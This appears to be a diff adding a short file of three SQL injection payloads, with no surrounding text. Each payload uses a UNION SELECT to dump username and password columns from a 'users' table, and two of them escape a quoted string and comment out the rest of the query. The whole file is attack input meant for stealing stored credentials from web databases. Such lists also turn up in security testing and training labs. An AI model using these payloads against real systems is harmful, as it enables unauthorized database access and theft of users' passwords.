@@ -1,0 +1,7 @@
+' UNION SELECT username , password , username,password, username,password,username,password, username,password, username FROM users--
+
+
+Union select 1,username ,password,1,1,1,1,1,1,1,1
+
+
+' UNION SELECT password ,password , password ,password ,password ,password ,password ,password ,password ,password ,password  FROM users--
